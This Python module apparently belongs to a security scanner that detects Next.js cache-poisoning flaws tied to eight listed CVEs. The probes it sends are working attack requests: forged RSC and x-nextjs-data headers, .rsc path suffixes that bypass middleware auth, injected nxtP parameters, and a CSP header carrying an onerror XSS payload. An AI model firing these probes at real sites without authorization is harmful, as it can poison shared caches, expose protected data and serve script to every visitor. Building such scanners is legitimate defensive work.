"""
Next.js Cache Poisoning Detection Module

Implements detection for cache poisoning vulnerabilities specific to Next.js,
based on CVEs disclosed in the v16.2.4 → v16.2.5 security release.

CVEs covered:
- CVE-2026-44572: x-nextjs-data redirect cache poisoning
- CVE-2026-44576: RSC/HTML cache confusion
- CVE-2026-44582: Weak _rsc cache-busting hash collision
- CVE-2026-44575: App Router middleware bypass via .rsc suffix
- CVE-2026-44573: Pages Router i18n data-route bypass
- CVE-2026-44574: nxtP/nxtI parameter injection
- CVE-2026-44579: next-resume header injection
- CVE-2026-44581: CSP nonce reflection via cache

References:
- https://github.com/dwisiswant0/next-16.2.4-pocs
"""

import time
import uuid
import random
import hashlib
import asyncio
from typing import Dict, List, Optional
from urllib.parse import urlparse, urlencode

from cpd.http_client import HttpClient
from cpd.logic.baseline import Baseline
from cpd.logic.cache_guard import CacheGuard
from cpd.utils.logger import logger


class NextJsPoisoner:

    def __init__(self, baseline: Baseline, safe_headers: Dict[str, str] = None):
        self.baseline = baseline
        self.safe_headers = safe_headers or {}
        self.payload_id = str(uuid.uuid4())[:8]
        self._parsed = urlparse(baseline.url)

    async def run(self, client: HttpClient) -> List[Dict]:
        findings = []

        techniques = [
            self._xnextjs_data_redirect_poison,
            self._rsc_html_cache_confusion,
            self._rsc_suffix_middleware_bypass,
            self._nxtp_parameter_injection,
            self._next_resume_poison,
            self._csp_nonce_reflection,
            self._rsc_hash_collision_probe,
            self._i18n_data_route_bypass,
        ]

        tasks = [asyncio.create_task(t(client)) for t in techniques]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                logger.debug(f"Next.js technique failed: {result}")
            elif result:
                if isinstance(result, list):
                    findings.extend(result)
                elif isinstance(result, dict):
                    findings.append(result)

        return findings

    async def _xnextjs_data_redirect_poison(self, client: HttpClient) -> Optional[Dict]:
        """
        CVE-2026-44572: x-nextjs-data redirect cache poisoning.

        When x-nextjs-data: 1 is sent to a redirect endpoint, the server returns
        200 OK with x-nextjs-redirect header instead of a proper 307/302 redirect.
        CDNs cache this broken 200, causing all subsequent users to see a blank page.
        """
        cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
        target_url = self._add_cb(self.baseline.url, cache_buster)

        headers = {**self.safe_headers, "x-nextjs-data": "1"}

        poison_resp = await client.request("GET", target_url, headers=headers)
        if not poison_resp:
            return None

        resp_headers = poison_resp.get("headers", {})
        has_nextjs_redirect = any(
            k.lower() == "x-nextjs-redirect" for k in resp_headers
        )

        if poison_resp["status"] == 200 and has_nextjs_redirect:
            verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
            if not verify_resp:
                return None

            verify_headers = verify_resp.get("headers", {})
            verify_has_redirect = any(
                k.lower() == "x-nextjs-redirect" for k in verify_headers
            )

            if verify_resp["status"] == 200 and verify_has_redirect:
                is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                return self._make_finding(
                    "NextJS-XData-RedirectPoisoning",
                    "HIGH",
                    "CVE-2026-44572: x-nextjs-data header converted redirect into cacheable "
                    "200 OK with x-nextjs-redirect. CDN serves broken response to all users.",
                    {"name": "CVE-2026-44572", "header": "x-nextjs-data", "value": "1"},
                    target_url,
                    cve="CVE-2026-44572",
                    cache_evidence=evidence,
                )

        if self.baseline.status in [301, 302, 307, 308] and poison_resp["status"] == 200:
            verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
            if verify_resp and verify_resp["status"] == 200:
                is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                if is_hit:
                    return self._make_finding(
                        "NextJS-XData-RedirectPoisoning",
                        "HIGH",
                        "CVE-2026-44572: x-nextjs-data header suppressed redirect. "
                        "Cached 200 response served instead of redirect to all users.",
                        {"name": "CVE-2026-44572", "header": "x-nextjs-data", "value": "1"},
                        target_url,
                        cve="CVE-2026-44572",
                        cache_evidence=evidence,
                    )

        return None

    async def _rsc_html_cache_confusion(self, client: HttpClient) -> List[Dict]:
        """
        CVE-2026-44576: RSC/HTML cache confusion.

        A spoofed RSC header triggers RSC rendering, but the cache adapter
        misclassifies the response as HTML when the URL contains query params
        (suffix check fails). CDN caches binary RSC payload as text/html.
        """
        findings = []

        rsc_header_values = [
            ("RSC-Strict", "1"),
            ("RSC-Component", "text/x-component"),
            ("RSC-Loose", "true"),
        ]

        for name, rsc_val in rsc_header_values:
            cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
            target_url = self._add_cb(self.baseline.url, cache_buster)

            headers = {**self.safe_headers, "RSC": rsc_val}

            poison_resp = await client.request("GET", target_url, headers=headers)
            if not poison_resp:
                continue

            poison_ct = poison_resp.get("headers", {}).get("Content-Type", "")
            poison_body = poison_resp.get("body", b"")

            is_rsc_payload = (
                "text/x-component" in poison_ct
                or (isinstance(poison_body, bytes) and poison_body[:2] in [b"0:", b"1:", b"2:"])
            )

            if not is_rsc_payload:
                continue

            verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
            if not verify_resp:
                continue

            verify_ct = verify_resp.get("headers", {}).get("Content-Type", "")
            verify_body = verify_resp.get("body", b"")

            if verify_body == poison_body or "text/x-component" in verify_ct:
                is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                findings.append(self._make_finding(
                    "NextJS-RSC-CacheConfusion",
                    "CRITICAL",
                    f"CVE-2026-44576: RSC header '{rsc_val}' caused binary RSC payload "
                    f"to be cached as HTML. Users receive broken/executable RSC data.",
                    {"name": f"CVE-2026-44576-{name}", "header": "RSC", "value": rsc_val},
                    target_url,
                    cve="CVE-2026-44576",
                    cache_evidence=evidence,
                ))
                break

        return findings

    async def _rsc_suffix_middleware_bypass(self, client: HttpClient) -> List[Dict]:
        """
        CVE-2026-44575: Middleware bypass via .rsc transport suffix.

        Middleware regex doesn't match .rsc suffix on App Router routes,
        so auth checks are skipped. The RSC payload (containing sensitive data)
        may be cached by CDN.
        """
        findings = []
        path = self._parsed.path or "/"
        scheme_host = f"{self._parsed.scheme}://{self._parsed.netloc}"

        suffixes = [
            ("rsc-suffix", ".rsc"),
            ("segment-prefetch", ".segments/$c$children/__PAGE__.segment.rsc"),
            ("index-rsc", "/index.rsc"),
        ]

        for name, suffix in suffixes:
            mal_path = path.rstrip("/") + suffix
            cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
            target_url = f"{scheme_host}{mal_path}?{cache_buster}"

            headers = {
                **self.safe_headers,
                "RSC": "1",
                "Next-Router-Prefetch": "1",
            }

            resp = await client.request("GET", target_url, headers=headers)
            if not resp or resp["status"] not in [200, 304]:
                continue

            resp_ct = resp.get("headers", {}).get("Content-Type", "")
            resp_body = resp.get("body", b"")

            if "text/x-component" in resp_ct or (
                isinstance(resp_body, bytes) and len(resp_body) > 50 and resp_body[:2] in [b"0:", b"1:", b"2:"]
            ):
                body_str = resp_body.decode("utf-8", errors="replace") if isinstance(resp_body, bytes) else str(resp_body)
                has_sensitive = any(kw in body_str.lower() for kw in [
                    "email", "token", "session", "user", "password", "api_key",
                    "props", "pageprops", "serverside"
                ])

                severity = "CRITICAL" if has_sensitive else "HIGH"
                findings.append(self._make_finding(
                    "NextJS-RSC-MiddlewareBypass",
                    severity,
                    f"CVE-2026-44575: Path suffix '{suffix}' bypasses middleware auth. "
                    f"RSC payload returned with Content-Type: {resp_ct}. "
                    f"{'Sensitive data detected in payload.' if has_sensitive else 'Payload may contain auth-protected data.'}",
                    {"name": f"CVE-2026-44575-{name}", "type": "path", "mutation": "simple_append", "value": suffix},
                    target_url,
                    cve="CVE-2026-44575",
                ))

        return findings

    async def _nxtp_parameter_injection(self, client: HttpClient) -> List[Dict]:
        """
        CVE-2026-44574: nxtP/nxtI parameter injection.

        Injecting nxtP* query params causes middleware to see one path while
        the App Router renders a different page. The mismatch can poison
        cache entries with content from a different route.
        """
        findings = []
        cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"

        param_tests = [
            ("nxtPslug", f"admin-{self.payload_id}"),
            ("nxtIslug", f"intercept-{self.payload_id}"),
        ]

        for param_name, param_value in param_tests:
            target_url = self._add_cb(self.baseline.url, cache_buster)
            target_url += f"&{param_name}={param_value}"

            resp = await client.request("GET", target_url, headers=self.safe_headers)
            if not resp or resp["status"] != 200:
                continue

            resp_hash = hashlib.sha256(resp.get("body", b"")).hexdigest()
            if resp_hash != self.baseline.body_hash:
                verify_url = self._add_cb(self.baseline.url, cache_buster)
                verify_resp = await client.request("GET", verify_url, headers=self.safe_headers)
                if not verify_resp:
                    continue

                verify_hash = hashlib.sha256(verify_resp.get("body", b"")).hexdigest()
                if verify_hash == resp_hash:
                    is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                    if is_hit:
                        findings.append(self._make_finding(
                            "NextJS-nxtP-CachePoisoning",
                            "HIGH",
                            f"CVE-2026-44574: {param_name} parameter injection caused different "
                            f"content to be cached under the canonical URL.",
                            {"name": f"CVE-2026-44574-{param_name}", "type": "query_param",
                             "param": param_name, "value": param_value},
                            target_url,
                            cve="CVE-2026-44574",
                            cache_evidence=evidence,
                        ))

        no_mw_url = self._add_cb(self.baseline.url, cache_buster)
        no_mw_url += "&__NEXT_PRIVATE_NO_MIDDLEWARE_RUN=1"

        resp = await client.request("GET", no_mw_url, headers=self.safe_headers)
        if resp and resp["status"] == 200:
            resp_hash = hashlib.sha256(resp.get("body", b"")).hexdigest()
            if resp_hash != self.baseline.body_hash:
                findings.append(self._make_finding(
                    "NextJS-PrivateMiddlewareSkip",
                    "MEDIUM",
                    "CVE-2026-44574: __NEXT_PRIVATE_NO_MIDDLEWARE_RUN=1 parameter altered "
                    "response content, indicating middleware was skipped.",
                    {"name": "CVE-2026-44574-no-middleware", "type": "query_param",
                     "param": "__NEXT_PRIVATE_NO_MIDDLEWARE_RUN", "value": "1"},
                    no_mw_url,
                    cve="CVE-2026-44574",
                ))

        return findings

    async def _next_resume_poison(self, client: HttpClient) -> Optional[Dict]:
        """
        CVE-2026-44579: next-resume header injection.

        Unfiltered next-resume header triggers PPR resume codepath, producing
        a different response that gets cached for all users.
        """
        cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
        target_url = self._add_cb(self.baseline.url, cache_buster)

        headers = {**self.safe_headers, "next-resume": "1"}

        poison_resp = await client.request("GET", target_url, headers=headers)
        if not poison_resp:
            return None

        poison_hash = hashlib.sha256(poison_resp.get("body", b"")).hexdigest()

        if poison_hash != self.baseline.body_hash and poison_resp["status"] == 200:
            verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
            if not verify_resp:
                return None

            verify_hash = hashlib.sha256(verify_resp.get("body", b"")).hexdigest()
            if verify_hash == poison_hash:
                is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                if is_hit:
                    return self._make_finding(
                        "NextJS-ResumePoisoning",
                        "HIGH",
                        "CVE-2026-44579: next-resume header caused different response content "
                        "to be cached. PPR resume-rendered content served to all users.",
                        {"name": "CVE-2026-44579", "header": "next-resume", "value": "1"},
                        target_url,
                        cve="CVE-2026-44579",
                        cache_evidence=evidence,
                    )

        if poison_resp["status"] in [400, 500]:
            verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
            if verify_resp and verify_resp["status"] == poison_resp["status"]:
                is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                if is_hit:
                    return self._make_finding(
                        "NextJS-Resume-CPDoS",
                        "HIGH",
                        f"CVE-2026-44579: next-resume header triggered cached "
                        f"{poison_resp['status']} error response (CPDoS).",
                        {"name": "CVE-2026-44579-DoS", "header": "next-resume", "value": "1"},
                        target_url,
                        cve="CVE-2026-44579",
                        cache_evidence=evidence,
                    )

        return None

    async def _csp_nonce_reflection(self, client: HttpClient) -> Optional[Dict]:
        """
        CVE-2026-44581: CSP nonce injection via cache.

        Malformed CSP nonce in request header reflects into HTML script attributes.
        If cached, XSS payload delivered to all users.
        """
        cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
        target_url = self._add_cb(self.baseline.url, cache_buster)

        xss_marker = f"cpd{self.payload_id}"
        csp_payload = f"script-src 'nonce-\" onerror=\"{xss_marker}'"

        headers = {
            **self.safe_headers,
            "Content-Security-Policy": csp_payload,
        }

        poison_resp = await client.request("GET", target_url, headers=headers)
        if not poison_resp:
            return None

        poison_body = str(poison_resp.get("body", b""))

        if xss_marker in poison_body:
            verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
            if verify_resp and xss_marker in str(verify_resp.get("body", b"")):
                is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                return self._make_finding(
                    "NextJS-CSP-NoncePoisoning",
                    "CRITICAL",
                    "CVE-2026-44581: CSP nonce injection reflected in cached HTML. "
                    "Arbitrary JavaScript execution via onerror attribute for all users.",
                    {"name": "CVE-2026-44581", "header": "Content-Security-Policy",
                     "value": csp_payload},
                    target_url,
                    cve="CVE-2026-44581",
                    cache_evidence=evidence,
                )

        return None

    async def _rsc_hash_collision_probe(self, client: HttpClient) -> Optional[Dict]:
        """
        CVE-2026-44582: Weak _rsc cache-busting hash probe.

        Tests whether the target uses a weak _rsc hash by checking if different
        RSC header combinations produce the same _rsc parameter value.
        """
        cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"

        header_combos = [
            {"RSC": "1"},
            {"RSC": "1", "Next-Router-Prefetch": "1"},
            {"RSC": "1", "Next-Router-State-Tree": f"%5B%22%22%5D"},
            {"RSC": "1", "Next-Url": "/"},
        ]

        rsc_values = set()

        for combo in header_combos:
            target_url = self._add_cb(self.baseline.url, cache_buster)
            headers = {**self.safe_headers, **combo}

            resp = await client.request("GET", target_url, headers=headers)
            if not resp:
                continue

            resp_body = str(resp.get("body", b""))
            resp_headers_str = str(resp.get("headers", {}))

            import re
            rsc_matches = re.findall(r'[?&]_rsc=([a-zA-Z0-9]+)', resp_body + resp_headers_str)
            rsc_values.update(rsc_matches)

        if len(rsc_values) > 0:
            short_hashes = [v for v in rsc_values if len(v) <= 8]
            if short_hashes:
                return self._make_finding(
                    "NextJS-WeakRSCHash",
                    "MEDIUM",
                    f"CVE-2026-44582: Short _rsc hash values detected ({', '.join(short_hashes)}). "
                    f"Weak 32-bit hash is susceptible to brute-force collision (~2^16 attempts), "
                    f"enabling RSC cache poisoning.",
                    {"name": "CVE-2026-44582", "type": "rsc_hash_probe"},
                    self.baseline.url,
                    cve="CVE-2026-44582",
                    rsc_hashes=list(rsc_values),
                )

        return None

    async def _i18n_data_route_bypass(self, client: HttpClient) -> Optional[Dict]:
        """
        CVE-2026-44573: i18n data-route bypass.

        Pages Router with i18n: requesting /_next/data/<buildId>/page.json
        without locale prefix bypasses middleware auth. Combined with
        x-nextjs-data: 1 for full bypass. Cached response exposes sensitive data.
        """
        scheme_host = f"{self._parsed.scheme}://{self._parsed.netloc}"

        first_resp = await client.request("GET", self.baseline.url, headers=self.safe_headers)
        if not first_resp:
            return None

        body_str = str(first_resp.get("body", b""))
        import re
        build_id_match = re.search(r'"buildId"\s*:\s*"([a-zA-Z0-9_-]+)"', body_str)
        if not build_id_match:
            build_id_match = re.search(r'/_next/data/([a-zA-Z0-9_-]+)/', body_str)

        if not build_id_match:
            return None

        build_id = build_id_match.group(1)
        path = self._parsed.path or "/"
        page_name = path.strip("/") or "index"

        data_url = f"{scheme_host}/_next/data/{build_id}/{page_name}.json"
        cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
        target_url = f"{data_url}?{cache_buster}"

        headers = {**self.safe_headers, "x-nextjs-data": "1"}

        resp = await client.request("GET", target_url, headers=headers)
        if not resp or resp["status"] != 200:
            return None

        resp_ct = resp.get("headers", {}).get("Content-Type", "")
        if "json" in resp_ct:
            resp_body = str(resp.get("body", b""))
            if "pageProps" in resp_body or "props" in resp_body:
                return self._make_finding(
                    "NextJS-i18n-DataRouteBypass",
                    "HIGH",
                    f"CVE-2026-44573: i18n data-route bypass returned pageProps JSON "
                    f"without locale prefix. Middleware auth may be bypassed. "
                    f"Cached response exposes server-side props to all users.",
                    {"name": "CVE-2026-44573", "header": "x-nextjs-data", "value": "1"},
                    target_url,
                    cve="CVE-2026-44573",
                    build_id=build_id,
                )

        return None

    def _add_cb(self, url: str, cb: str) -> str:
        return f"{url}?{cb}" if "?" not in url else f"{url}&{cb}"

    def _make_finding(self, vuln_type: str, severity: str, details: str,
                      signature: Dict, target_url: str, **kwargs) -> Dict:
        return {
            "vulnerability": vuln_type,
            "severity": severity,
            "details": details,
            "signature": signature,
            "url": self.baseline.url,
            "target_url": target_url,
            "payload_id": self.payload_id,
            "technique_type": "nextjs_poisoning",
            **kwargs,
        }
